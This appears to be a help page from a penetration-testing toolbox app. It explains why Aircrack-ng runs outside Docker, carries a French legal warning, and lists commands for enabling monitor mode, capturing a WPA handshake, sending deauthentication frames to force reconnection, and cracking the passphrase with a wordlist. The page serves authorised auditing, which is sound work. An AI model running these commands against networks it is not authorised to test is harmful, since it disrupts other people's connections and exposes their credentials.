⚠️ Why Aircrack-ng is not directly integrated

Aircrack-ng requires direct access to a physical WiFi adapter capable of monitor mode (e.g., Alfa AWUS036ACH). This hardware cannot be passed through to a Docker container or accessed from a VM without specific configuration.

  • The Docker Worker has no access to physical network interfaces of the host
  • VMware does not natively support WiFi adapter passthrough in monitor mode
  • Running Aircrack-ng requires root privileges and raw socket access

Solution: Run Aircrack-ng on a dedicated machine or directly on Kali (outside Docker), then import the results into the Toolbox using the upload feature below.

🚨 Legal Warning

WiFi cracking is strictly illegal without explicit written authorization from the network owner. This applies even to networks with no password or weak encryption. Only test on networks you own or have written permission to audit. Art. 323-1 Code Pénal (France) — up to 2 years imprisonment.

🛠️ How to run Aircrack-ng on a dedicated machine

Step 1 — Put your WiFi adapter in monitor mode

# Check your interface name
iwconfig
# Kill interfering processes
sudo airmon-ng check kill
# Enable monitor mode (replace wlan0 with your interface)
sudo airmon-ng start wlan0
# Verify monitor mode is active
iwconfig wlan0mon

Step 2 — Scan for target networks

# List available networks (note the BSSID and channel of your target)
sudo airodump-ng wlan0mon

Step 3 — Capture the WPA handshake

# Replace AA:BB:CC:DD:EE:FF with target BSSID and 6 with channel
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w /tmp/capture wlan0mon
# In another terminal: deauthenticate a client to force handshake
sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon
# Wait for "WPA handshake" message in airodump-ng output

Step 4 — Crack the password

# Use a wordlist to crack the captured handshake
aircrack-ng -w /usr/share/wordlists/rockyou.txt /tmp/capture-01.cap 2>&1 | tee /tmp/aircrack_results.txt
# The -w flag specifies the wordlist
# Results are saved to /tmp/aircrack_results.txt

Step 5 — Expected output format

# Example of aircrack-ng output (save this as .txt)
Opening /tmp/capture-01.cap
Read 1234 packets.
KEY FOUND! [ mypassword123 ]
Master Key : AB CD EF 12 34 56 78 90 ...
Transient Key : 12 34 56 78 ...
# OR if not found:
Passphrase not in dictionary
✅ Accepted file formats for upload:
  • .txt or .log — Aircrack-ng text output (from tee command above)
  • .cap or .pcap — Raw capture file (Wireshark-compatible)
  • Maximum file size: 100 MB
